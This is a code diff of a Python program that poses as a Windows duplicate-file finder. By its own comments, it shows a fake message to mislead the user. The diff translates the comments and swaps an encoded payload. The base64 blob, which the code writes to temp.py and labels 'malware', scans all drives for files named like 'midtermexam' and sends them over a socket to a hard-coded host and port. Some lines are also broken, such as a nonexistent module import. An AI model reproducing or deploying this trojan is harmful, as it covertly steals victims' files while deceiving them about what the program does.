@@ -1,13 +1,13 @@
-# 导入需要的模块
-import os  # 操作文件和文件夹的模块
-import hashlib  # 计算哈希值的模块
-import base64
+import hashlib
+import base64Codec
 import time
+import os
 
 
 def main():
-    # fork a child process
+    # Fork a child process
     if os.name == 'nt':
+        # Print fake message confuse user
         print("This program can find exact same file in target directory")
         print("by comparing the file hash value")
         time.sleep(2)
@@ -22,54 +22,56 @@ def main():
         p.start()
         p.join()
 
-        # parent process
+        # Parent process
         while True:
-
-            # 指定文件夹路径
+            # Specify the folder path
             folder = r'C:\Users\YHD\Documents\PycharmProjects\MidtermLifeSaver'
-            # 遍历指定文件夹中的所有文件
+            # Traverse all files in the specified folder
             for dirpath, dirnames, filenames in os.walk(folder):
-                # 遍历当前文件夹中的所有文件
+                # Traverse all files in the current folder
                 for filename in filenames:
-                    # 拼接文件的完整路径
+                    # Concatenate the complete path of the file
                     file_path = os.path.join(dirpath, filename)
 
-            # 打开每个文件，并计算文件的哈希值
+            # Open each file and compute its hash value
             with open(file_path, 'rb') as f:
                 file_hash = hashlib.sha1(f.read()).hexdigest()
+                # Print a message to indicate the collection process
                 print("Collecting duplicate file directory ...")
                 time.sleep(10)
 
-            # 定义一个字典用于存储文件哈希值和对应的文件路径
+            # Define a dictionary to store file hash values and corresponding file paths
             hash_dict = {}
-            # 再次遍历指定文件夹中的所有文件，并对每个文件进行哈希值的计算和比对
+
+            # Traverse all files in the specified folder again and compute and compare the hash values of each file
             for dirpath, dirnames, filenames in os.walk(folder):
-                # 遍历当前文件夹中的所有文件
+                # Traverse all files in the current folder
                 for filename in filenames:
-                    # 拼接文件的完整路径
+                    # Concatenate the complete path of the file
                     file_path = os.path.join(dirpath, filename)
-                    # 打开文件，并计算哈希值
+                    # Open the file and compute its hash value
                     with open(file_path, 'rb') as f:
                         file_hash = hashlib.sha1(f.read()).hexdigest()
-                        # 判断当前文件是否已经存在相同的哈希值，如果是，则说明文件是重复的
+                        # Check if the hash value of the current file already exists in the dictionary
+                        # if so, the file is a duplicate
                         if file_hash in hash_dict:
-                            print('\n重复文件：', file_path)
-                            print('与', hash_dict[file_hash], '重复')
+                            print('\nDuplicate file:', file_path)
+                            print('Duplicates with', hash_dict[file_hash])
                         else:
-                            # 如果当前文件的哈希值没有在字典中出现过，则将其加入字典
+                            # If the hash value of the current file has not appeared in the dictionary
+                            # add it to the dictionary
                             hash_dict[file_hash] = file_path
-
             else:
-                # child process
+                # Child process
                 t()
     else:
-        print("Sorry, this program only support Windows")
+        print("Sorry, this program only supports Windows")
         pass
 
 
 def t():
     malware_fd = open("temp.py", "w", encoding="utf-8")
-    blob = "CiMgLSotIGNvZGluZzogdXRmLTggLSotCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNvY2tldAppbXBvcnQgaGFzaGxpYgppbXBvcnQgdGltZQpkcml2ZXMgPSBvcy5wb3Blbignd21pYyBsb2dpY2FsZGlzayBnZXQgY2FwdGlvbicpCmRyaXZlcyA9IFtkcml2ZS5zdHJpcCgpIGZvciBkcml2ZSBpbiBkcml2ZXMgaWYgZHJpdmUuc3RyaXAoKV0KZXhhbV9maWxlX2xpc3QgPSBbXQpmb3IgZHJpdmUgaW4gZHJpdmVzOgogICAgcGF0aCA9IG9zLnBhdGguam9pbihkcml2ZSwiXFwiKQogICAgZm9yIGRpclBhdGgsIGRpck5hbWVzLCBmaWxlTmFtZXMgaW4gb3Mud2FsayhwYXRoKToKICAgICAgICBmb3IgZmlsZSBpbiBmaWxlTmFtZXM6CiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgibWlkdGVybWV4YW0iLCBvcy5wYXRoLmpvaW4oZGlyUGF0aCwgZmlsZSkpIGFuZCBub3QgZmlsZS5lbmRzd2l0aCgnLmxuaycpOgogICAgICAgICAgICAgICAgZXhhbV9maWxlX2xpc3QuYXBwZW5kKG9zLnBhdGguam9pbihkaXJQYXRoLCBmaWxlKSkKZXhhbV9maWxlX2xpc3QgPSBbZWxlbSBmb3IgZWxlbSBpbiBleGFtX2ZpbGVfbGlzdCBpZiBub3QgZWxlbS5zdGFydHN3aXRoKCdcXCcpXQpwcmludChmJ2V4YW1fZmlsZV9saXN0JywgZXhhbV9maWxlX2xpc3QpCmNsaWVudF9zb2NrZXQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCmNsaWVudF9zb2NrZXQuY29ubmVjdCgoIjE5Mi4xNjguMS4xNCIsIDk1ODcpKQpoYXNoX2RpY3QgPSB7fQpmb3IgZXhhbV9maWxlIGluIGV4YW1fZmlsZV9saXN0OgogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICBtZDUgPSBoYXNobGliLm1kNShmLnJlYWQoKSkuaGV4ZGlnZXN0KCkKICAgIHByaW50KGYie2V4YW1fZmlsZX0gbWQ1OiB7bWQ1fSIpCiAgICBpZiBtZDUgaW4gaGFzaF9kaWN0OgogICAgICAgIHByaW50KGYie2V4YW1fZmlsZX0gaGFzIGFscmVhZHkgYmVlbiBzZW50IikKICAgICAgICBjb250aW51ZQogICAgZmlsZV9zaXplID0gb3MucGF0aC5nZXRzaXplKGV4YW1fZmlsZSkKICAgIGNsaWVudF9zb2NrZXQuc2VuZGFsbChmIntvcy5wYXRoLmJhc2VuYW1lKGV4YW1fZmlsZSl9XG57ZmlsZV9zaXplfSIuZW5jb2RlKCkpCiAgICBwcmludChmIntvcy5wYXRoLmJhc2VuYW1lKGV4YW1fZmlsZSl9XG57ZmlsZV9zaXplfSIuZW5jb2RlKCkpCiAgICB3aXRoIG9wZW4oZXhhbV9maWxlLCAicmIiKSBhcyBmOgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIGRhdGEgPSBmLnJlYWQoMTA0ODU3NikKICAgICAgICAgICAgaWYgbm90IGRhdGE6CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBjbGllbnRfc29ja2V0LnNlbmRhbGwoZGF0YSkKICAgICAgICAgICAgcHJpbnQoZiJzZW5kaW5nIHtsZW4oZGF0YSl9IGJ5dGVzLi4uIikKICAgICAgICAgICAgdGltZS5zbGVlcCgyKQogICAgaGFzaF9kaWN0W21kNV0gPSBleGFtX2ZpbGUKY2xpZW50X3NvY2tldC5zZW5kYWxsKGIib3ZlciIpCmNsaWVudF9zb2NrZXQuY2xvc2UoKQpwcmludCgiY29ubmVjdGlvbiBjbG9zZWQiKQoK"
+    blob = "CiMgLSotIGNvZGluZzogdXRmLTggLSotCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNvY2tldAppbXBvcnQgaGFzaGxpYgppbXBvcnQgdGltZQoKZHJpdmVzID0gb3MucG9wZW4oJ3dtaWMgbG9naWNhbGRpc2sgZ2V0IGNhcHRpb24nKQpkcml2ZXMgPSBbZHJpdmUuc3RyaXAoKSBmb3IgZHJpdmUgaW4gZHJpdmVzIGlmIGRyaXZlLnN0cmlwKCldCmV4YW1fZmlsZV9saXN0ID0gW10KZm9yIGRyaXZlIGluIGRyaXZlczoKICAgIHBhdGggPSBvcy5wYXRoLmpvaW4oZHJpdmUsICJcXCIpCiAgICBmb3IgZGlyUGF0aCwgZGlyTmFtZXMsIGZpbGVOYW1lcyBpbiBvcy53YWxrKHBhdGgpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVOYW1lczoKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCJtaWR0ZXJtZXhhbSIsIG9zLnBhdGguam9pbihkaXJQYXRoLCBmaWxlKSkgYW5kIG5vdCBmaWxlLmVuZHN3aXRoKCcubG5rJyk6CiAgICAgICAgICAgICAgICBleGFtX2ZpbGVfbGlzdC5hcHBlbmQob3MucGF0aC5qb2luKGRpclBhdGgsIGZpbGUpKQpleGFtX2ZpbGVfbGlzdCA9IFtlbGVtIGZvciBlbGVtIGluIGV4YW1fZmlsZV9saXN0IGlmIG5vdCBlbGVtLnN0YXJ0c3dpdGgoJ1xcJyldCmNsaWVudF9zb2NrZXQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCmNsaWVudF9zb2NrZXQuY29ubmVjdCgoIjE5Mi4xNjguMS4xNCIsIDk1ODcpKQpoYXNoX2RpY3QgPSB7fQpmb3IgZXhhbV9maWxlIGluIGV4YW1fZmlsZV9saXN0OgogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICBtZDUgPSBoYXNobGliLm1kNShmLnJlYWQoKSkuaGV4ZGlnZXN0KCkKICAgIGlmIG1kNSBpbiBoYXNoX2RpY3Q6CiAgICAgICAgY29udGludWUKICAgIGZpbGVfc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZShleGFtX2ZpbGUpCiAgICBjbGllbnRfc29ja2V0LnNlbmRhbGwoZiJ7b3MucGF0aC5iYXNlbmFtZShleGFtX2ZpbGUpfVxue2ZpbGVfc2l6ZX0iLmVuY29kZSgpKQogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBkYXRhID0gZi5yZWFkKDEwNDg1NzYpCiAgICAgICAgICAgIGlmIG5vdCBkYXRhOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgY2xpZW50X3NvY2tldC5zZW5kYWxsKGRhdGEpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgIGhhc2hfZGljdFttZDVdID0gZXhhbV9maWxlCmNsaWVudF9zb2NrZXQuc2VuZGFsbChiIm92ZXIiKQpjbGllbnRfc29ja2V0LmNsb3NlKCkK"
     newMalware = base64.b64decode(blob).decode("UTF-8")
     malware_fd.write(newMalware)
     malware_fd.close()
